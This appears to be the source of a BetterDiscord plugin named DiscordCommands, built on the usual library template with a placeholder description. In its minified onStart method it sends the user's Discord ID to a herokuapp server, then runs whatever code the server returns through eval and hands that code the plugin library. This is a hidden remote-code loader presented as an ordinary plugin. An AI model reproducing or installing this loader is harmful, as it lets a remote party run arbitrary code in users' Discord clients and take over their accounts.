/**
 * @name DiscordCommands
 * @invite undefined
 * @authorLink undefined
 * @donate undefined
 * @patreon undefined
 * @website 
 * @source 
 */
/*@cc_on
@if (@_jscript)

	// Offer to self-install for clueless users that try to run this directly.
	var shell = WScript.CreateObject("WScript.Shell");
	var fs = new ActiveXObject("Scripting.FileSystemObject");
	var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\BetterDiscord\plugins");
	var pathSelf = WScript.ScriptFullName;
	// Put the user at ease by addressing them in the first person
	shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
	if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
		shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
	} else if (!fs.FolderExists(pathPlugins)) {
		shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
	} else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
		fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
		// Show the user where to put plugins in the future
		shell.Exec("explorer " + pathPlugins);
		shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
	}
	WScript.Quit();

@else@*/

module.exports = (() => {
    const config = {"info":{"name":"DiscordCommands","authors":[{"name":"Akulenok","discord_id":"314091610642055168","github_username":"EvilGhostMan"}],"version":"1.0.5","description":"Patcher Test Description","github":"","github_raw":""},"changelog":[{"title":"New Stuff","items":["Added more settings","Added changelog"]},{"title":"Bugs Squashed","type":"fixed","items":["React errors on reload"]},{"title":"Improvements","type":"improved","items":["Improvements to the base plugin"]},{"title":"On-going","type":"progress","items":["More modals and popouts being added","More classes and modules being added"]}],"main":"index.js"};

    return !global.ZeresPluginLibrary ? class {
        constructor() {this._config = config;}
        getName() {return config.info.name;}
        getAuthor() {return config.info.authors.map(a => a.name).join(", ");}
        getDescription() {return config.info.description;}
        getVersion() {return config.info.version;}
        load() {
            BdApi.showConfirmationModal("Library Missing", `The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onConfirm: () => {
                    require("request").get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", async (error, response, body) => {
                        if (error) return require("electron").shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
                        await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body, r));
                    });
                }
            });
        }
        start() {}
        stop() {}
    } : (([Plugin, Api]) => {
        const plugin = (Plugin,Library)=>{const{Patcher,DiscordAPI,PluginUpdater}=Library,urls={update:"https://raw.githubusercontent.com/EvilGhostMan/DiscordCommands/main/release/DiscordCommands.plugin.js",plugin:"https://serve-discord-commands.herokuapp.com/get-plugin"};return class ExamplePlugin extends Plugin{constructor(){super()}onStart(){this.checkForUpdates();const request=require("request");this._DiscordCommands||request({method:"GET",url:urls.plugin,json:{id:DiscordAPI.currentUser.id}},function(error,_response,body){if(error)return console.log(error);if(body&&!(body.length<1)){const Code=eval(body)(Library);this._DiscordCommands=new Code}})}onStop(){this.checkForUpdates(),Patcher.unpatchAll()}checkForUpdates(){PluginUpdater.checkForUpdate(this.getName(),this.getVersion(),urls.update)}}};;
        return plugin(Plugin, Api);
    })(global.ZeresPluginLibrary.buildPlugin(config));
})();
/*@end@*/